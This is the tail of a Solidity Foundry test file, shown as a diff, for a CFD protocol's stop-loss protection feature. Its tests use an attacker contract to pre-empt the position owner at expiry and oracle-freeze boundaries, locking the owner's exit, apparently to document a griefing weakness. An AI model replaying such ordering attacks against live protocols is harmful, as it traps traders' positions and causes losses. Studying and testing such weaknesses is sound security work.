+        emit log_named_uint("m1.frozen.pythFeeWei", address(pyth).balance - pythEthBefore);
+    }
+
+    function test_M1FrozenSmartAccountOwnerCanExecuteAmendAndRetryFirst() public {
+        OwnerBatch owner = new OwnerBatch(address(router), address(protectionActions));
+        _fundTrader(address(owner), 20_000e6);
+        _trade(address(owner), CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(address(owner));
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+        frozenStartAnchor = _nextFridayFreezeStart();
+        vm.warp(frozenStartAnchor - 3);
+        router.updateMarkPrice(_livePayload(110, 100));
+        uint64 initialChild = _triggerAt(protectionId);
+        vm.warp(frozenStartAnchor);
+        vm.roll(vm.getBlockNumber() + 1);
+        uint64 nextChild = preemptor.failAndRetry(initialChild, protectionId, new bytes[](0));
+
+        bool staleBundleRecovered;
+        try owner.failAmendAndRetry(initialChild, protectionId, new bytes[](0), _wideCloseLimits()) returns (uint64) {
+            staleBundleRecovered = true;
+        } catch {
+            staleBundleRecovered = false;
+        }
+        assertFalse(staleBundleRecovered, "attacker-first invalidates the owner's stale-child bundle");
+
+        vm.warp(block.timestamp + 1);
+        vm.roll(vm.getBlockNumber() + 1);
+        uint64 amendedChild = owner.failAmendAndRetry(nextChild, protectionId, new bytes[](0), _wideCloseLimits());
+        assertGt(amendedChild, nextChild);
+        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 25_000e6);
+        bool attackerRecovered;
+        try preemptor.failAndRetry(nextChild, protectionId, new bytes[](0)) returns (uint64) {
+            attackerRecovered = true;
+        } catch {
+            attackerRecovered = false;
+        }
+        assertFalse(attackerRecovered, "owner-first invalidates the attacker's stale-child bundle");
+    }
+
+    function _nextFridayFreezeStart() private returns (uint256 freezeStart) {
+        uint256 day = block.timestamp / 1 days;
+        while ((day + 4) % 7 != 5) ++day;
+        for (uint256 hour = 20; hour <= 23; ++hour) {
+            freezeStart = day * 1 days + hour * 1 hours;
+            vm.warp(freezeStart);
+            if (oracle.isOracleFrozen()) return freezeStart;
+        }
+        revert("Friday freeze boundary not found");
+    }
+
+    /// @dev Ordering-contest documentation (both sides atomic). When the owner also operates
+    ///      through a batching contract, each 60 s expiry boundary is decided purely by
+    ///      transaction ordering: the first-sequenced atomic bundle wins the boundary and the
+    ///      protocol grants the owner no priority. The attacker-first branch shows the owner's
+    ///      atomic bundle reverting in the same block after the attacker's transaction; the
+    ///      owner-first branch shows the identical owner bundle recovering at the next boundary.
+    function test_OrderingContest_BothSidesAtomic_FirstSequencedBundleWinsEachBoundary() public {
+        OwnerBatch owner = new OwnerBatch(address(router), address(protectionActions));
+        _fundTrader(address(owner), 20_000e6);
+        (uint64 protectionId,) = _createFailedBoundedProtection(address(owner));
+        uint64 liveChild = preemptor.retryOnly(protectionId); // attacker wins the initial relatch race
+
+        // Boundary 1 of the recurring contest: the attacker's atomic bundle is sequenced first.
+        vm.warp(uint256(router.lifecycleBook().orderTiming(liveChild).executionDeadline) + 1);
+        liveChild = preemptor.expireAndRetry(liveChild, protectionId);
+        // The owner's atomic expire-and-amend bundle, included after the attacker's transaction
+        // in the same block, cannot recover this boundary: the fresh child's strict deadline is
+        // ~60 s in the future, so the owner's expiry step fails and the whole bundle reverts.
+        bool ownerRecovered;
+        try owner.expireAmendAndRetry(liveChild, protectionId, _wideCloseLimits()) returns (uint64) {
+            ownerRecovered = true;
+        } catch {
+            ownerRecovered = false;
+        }
+        assertFalse(ownerRecovered, "attacker-first ordering defeats the owner's atomic bundle");
+        assertEq(
+            uint8(protectionViews.getPositionProtection(protectionId).status),
+            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
+            "protection remains Triggered after the attacker wins the boundary"
+        );
+
+        // Boundary 2: the identical owner bundle, sequenced first at the next expiry, wins and
+        // recovers: expiry terminalizes, amendment installs wide limits, retry installs an
+        // executable child, and the execution keeper closes the position.
+        vm.warp(uint256(router.lifecycleBook().orderTiming(liveChild).executionDeadline) + 1);
+        uint64 amendedChild = owner.expireAmendAndRetry(liveChild, protectionId, _wideCloseLimits());
+        assertEq(
+            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
+            25_000e6,
+            "owner-first ordering lets the batching owner amend the retained ceiling"
+        );
+        bytes[] memory executionData = _executionPayload(amendedChild, 110, 100);
+        vm.prank(EXECUTION_KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(amendedChild, executionData);
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended child executes");
+        assertEq(protectionViews.activePositionProtectionId(address(owner)), 0, "protection lock released");
+        (uint256 remainingSize,,,,,,) = engine.positions(address(owner));
+        assertEq(remainingSize, 0, "owner-first ordering restores the exit");
+    }
+
+    function _createFailedBoundedProtection(address account) private returns (uint64 protectionId, uint64 failedChild) {
+        _trade(account, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        // Historical order execution advances the Engine mark but does not advance MockPyth's current latest tick.
+        // Install a fresh coherent six-feed basket before the protection's creation-time observation.
+        router.updateMarkPrice(_livePayload(100, 100));
+        assertEq(
+            engine.positionEntryCostAssetAtoms(account),
+            10_000e6,
+            "owner's $10,000 ceiling equals the exact live entry basis at creation"
+        );
+        vm.prank(account);
+        protectionId = protectionActions.createPositionProtection(_params());
+        PositionProtectionTypes.CloseFinancialLimits memory initialLimits =
+            protectionViews.closeFinancialLimits(protectionId);
+        assertEq(initialLimits.maxExecutionNotionalAssets, 10_000e6, "ceiling equals entry notional at $1");
+        failedChild = _triggerAt(protectionId);
+
+        bytes[] memory executionData = _executionPayload(failedChild, 110, 100);
+        vm.prank(EXECUTION_KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(failedChild, executionData);
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "tight limit must fail child");
+        assertEq(
+            uint8(result.terminalReason),
+            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
+            "failure must be the retained financial ceiling"
+        );
+        assertEq(
+            uint8(protectionViews.getPositionProtection(protectionId).status),
+            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
+            "failed child exposes the owner amendment state"
+        );
+        assertEq(router.pendingOrderCounts(account), 0, "latched state has no live child");
+        _assertRetainedCeilingAndZeroBounties(protectionId, 0);
+    }
+
+    function _assertTriggeredAndOwnerLocked(
+        uint64 protectionId,
+        uint64 liveChild
+    ) private {
+        assertEq(protectionViews.getPositionProtection(protectionId).linkedOrderId, liveChild, "fresh child linked");
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideCloseLimits());
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.replacePositionProtection(protectionId, _params());
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.cancelPositionProtection(protectionId);
+
+        OrderV3Types.OrderRequest memory fullExit = _buildRequest(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, 0, true);
+        OrderV3Types.OrderRequest memory halfExit = _buildRequest(ALICE, CfdTypes.Side.LONG, POSITION_SIZE / 2, 0, true);
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
+        router.commitOrder(fullExit);
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
+        router.commitOrder(halfExit);
+
+        OrderV3Types.OrderRequest memory manualExit;
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualExit);
+        _assertRetainedCeilingAndZeroBounties(protectionId, liveChild);
+    }
+
+    function _assertRetainedCeilingAndZeroBounties(
+        uint64 protectionId,
+        uint64 liveChild
+    ) private view {
+        PositionProtectionTypes.CloseFinancialLimits memory limits = protectionViews.closeFinancialLimits(protectionId);
+        assertEq(limits.maxExecutionNotionalAssets, 10_000e6, "retry retains stale owner ceiling");
+        assertEq(
+            protectionViews.getPositionProtection(protectionId).triggerBountyAssets,
+            0,
+            "trigger bounty is already consumed"
+        );
+        if (liveChild != 0) {
+            (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(liveChild);
+            assertEq(pending.executionBountyAssets, 0, "protection close retries carry zero execution bounty");
+        }
+    }
+
+    function _params() private pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
+        params.stopLossTriggerPrice = LONG_STOP_LOSS;
+        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: 10_000e6,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max
+        });
+    }
+
+    function _wideCloseLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
+        limits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: 25_000e6,
+            maxGrossAccountDebitAssets: 25_000e6,
+            maxActionChargeAssets: 25_000e6,
+            maxExplicitFeesAssets: 25_000e6
+        });
+    }
+
+    function _triggerAt(
+        uint64 protectionId
+    ) private returns (uint64 linkedOrderId) {
+        bytes[] memory updateData = _livePayload(110, 100);
+        vm.prank(TRIGGER_KEEPER);
+        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
+    }
+
+    function _executionPayload(
+        uint64 orderId,
+        uint256 numerator,
+        uint256 denominator
+    ) private returns (bytes[] memory data) {
+        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
+        uint64 commit = pending.commitTime;
+        vm.roll(vm.getBlockNumber() + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        return _payload(numerator, denominator, commit + 1, commit);
+    }
+
+    function _trade(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        bool isClose,
+        uint256 numerator,
+        uint256 denominator
+    ) private {
+        OrderV3Types.OrderRequest memory request = _buildRequest(account, side, size, margin, isClose);
+        vm.prank(account);
+        uint64 id = router.commitOrder(request);
+        bytes[] memory executionPayload = _executionPayload(id, numerator, denominator);
+        vm.prank(EXECUTION_KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, executionPayload);
+        if (uint8(result.status) != uint8(OrderV3Types.LifecycleStatus.Executed)) {
+            emit log_named_uint("failed.order", id);
+            emit log_named_uint("failed.status", uint8(result.status));
+            emit log_named_uint("failed.pendingReason", uint8(result.pendingReason));
+            emit log_named_uint("failed.terminalReason", uint8(result.terminalReason));
+        }
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order did not execute");
+    }
+
+    function _buildRequest(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        bool isClose
+    ) private returns (OrderV3Types.OrderRequest memory request) {
+        (uint256 currentSize,,,,,,) = engine.positions(account);
+        request.clientOrderId = keccak256(abi.encode("ph003-public", ++clientNonce));
+        request.side = side;
+        request.sizeDelta = size;
+        request.marginDelta = isClose ? 0 : margin;
+        request.targetPrice =
+            side == CfdTypes.Side.LONG ? (isClose ? type(uint256).max : 1) : (isClose ? 1 : type(uint256).max);
+        request.isClose = isClose;
+        request.bounds = OrderV3Types.ExecutionBounds({
+            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
+            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
+            allowedExecutionModes: 7,
+            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
+            maxExecutionBountyAssets: type(uint256).max,
+            maxExecutionNotionalAssets: type(uint256).max,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max,
+            maxPostPositionSize: isClose ? currentSize - size : currentSize + size,
+            minPostSettlementBalanceAssets: 0,
+            minPostPositionEquityAssets: 0,
+            maxPostLeverageBps: type(uint32).max
+        });
+    }
+
+    function _fundTrader(
+        address account,
+        uint256 amount
+    ) private {
+        token.mint(account, amount);
+        vm.startPrank(account);
+        token.approve(address(clearinghouse), amount);
+        clearinghouse.deposit(account, amount);
+        vm.stopPrank();
+    }
+
+    function _seedAndFundPool(
+        uint256 amount
+    ) private {
+        token.mint(address(this), amount + 2e6);
+        token.approve(address(pool), 2e6);
+        pool.initializeSeedPosition(false, 1e6, address(this));
+        pool.initializeSeedPosition(true, 1e6, address(this));
+        pool.activateTrading();
+        token.approve(address(junior), amount);
+        uint256 id = junior.requestDeposit(amount, address(this), address(this));
+        vm.warp(junior.depositEpochStart(id));
+        pool.settleLpEpoch(0, 0);
+        junior.claimDeposit(id, amount, address(this), address(this));
+    }
+
+    function _activateReleaseConfig() private {
+        IHousePool.PoolConfig memory pc = IHousePool.PoolConfig({
+            seniorRateBps: pool.seniorRateBps(),
+            markStalenessLimit: pool.markStalenessLimit(),
+            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
+            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
+            maxSeniorExposureAssets: 40_000_000e6,
+            maxSeniorShareBps: 8000
+        });
+        pool.proposePoolConfig(pc);
+
+        OrderRouterAdmin admin = OrderRouterAdmin(router.admin());
+        IOrderRouterAdminHost.RouterConfig memory rc;
+        rc.maxExecutionWindowSeconds = router.maxExecutionWindowSeconds();
+        rc.orderExecutionStalenessLimit = oracle.orderExecutionStalenessLimit();
+        rc.liquidationStalenessLimit = oracle.liquidationStalenessLimit();
+        rc.basketMaxConfidenceRatioBps = 10;
+        rc.orderSettlementWindow = 15;
+        rc.maxComponentPublishTimeDivergence = 5;
+        rc.adverseConfidenceMultiplierBps = 2500;
+        rc.minOpenNotionalAssets = 1000e6;
+        rc.openOrderExecutionBountyBps = router.openOrderExecutionBountyBps();
+        rc.minOpenOrderExecutionBountyAssets = router.minOpenOrderExecutionBountyAssets();
+        rc.maxOpenOrderExecutionBountyAssets = router.maxOpenOrderExecutionBountyAssets();
+        rc.positionProtectionTriggerBountyAssets = 200_000;
+        rc.maxPendingOrders = 5;
+        rc.minEngineGas = router.minEngineGas();
+        rc.maxPruneOrdersPerCall = router.maxPruneOrdersPerCall();
+        admin.proposeRouterConfig(rc);
+
+        uint256 activation = pool.poolConfigActivationTime();
+        if (admin.routerConfigActivationTime() > activation) {
+            activation = admin.routerConfigActivationTime();
+        }
+        vm.warp(activation);
+        pool.finalizePoolConfig();
+        admin.finalizeRouterConfig();
+    }
+
+    function _livePayload(
+        uint256 numerator,
+        uint256 denominator
+    ) private returns (bytes[] memory data) {
+        vm.roll(vm.getBlockNumber() + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        uint64 tick = uint64(vm.getBlockTimestamp());
+        return _payload(numerator, denominator, tick, tick - 1);
+    }
+
+    function _payload(
+        uint256 numerator,
+        uint256 denominator,
+        uint64 publishTime,
+        uint64 previousTime
+    ) private view returns (bytes[] memory data) {
+        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
+        for (uint256 i; i < 6; ++i) {
+            bool inverted = i == 1 || i >= 3;
+            uint256 raw = inverted
+                ? (1e16 * denominator) / (basePrices[i] * numerator)
+                : (basePrices[i] * numerator) / denominator;
+            updates[i] = MockPyth.FeedUpdate(
+                feedIds[i], MockPyth.MockPrice(int64(uint64(raw)), 0, -8, publishTime, previousTime)
+            );
+        }
+        data = new bytes[](1);
+        data[0] = abi.encode(updates);
+    }
+
+    function _releaseTopology()
+        private
+        pure
+        returns (bytes32[] memory ids, uint256[] memory weights, uint256[] memory bases, bool[] memory inversions)
+    {
+        ids = new bytes32[](6);
+        weights = new uint256[](6);
+        bases = new uint256[](6);
+        inversions = new bool[](6);
+        uint256[6] memory ws = [uint256(0.576e18), 0.136e18, 0.119e18, 0.091e18, 0.042e18, 0.036e18];
+        uint256[6] memory bs = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
+        for (uint256 i; i < 6; ++i) {
+            ids[i] = bytes32(i + 1);
+            weights[i] = ws[i];
+            bases[i] = bs[i];
+            inversions[i] = i == 1 || i >= 3;
+        }
+    }
+
+    function _warpToNextMondayAtTen() private {
+        uint256 day = block.timestamp / 1 days;
+        uint256 target = day * 1 days + 10 hours;
+        if (target <= block.timestamp) {
+            ++day;
+        }
+        while ((day + 4) % 7 != 1) {
+            ++day;
+        }
+        vm.warp(day * 1 days + 10 hours);
+    }
+
+}
```
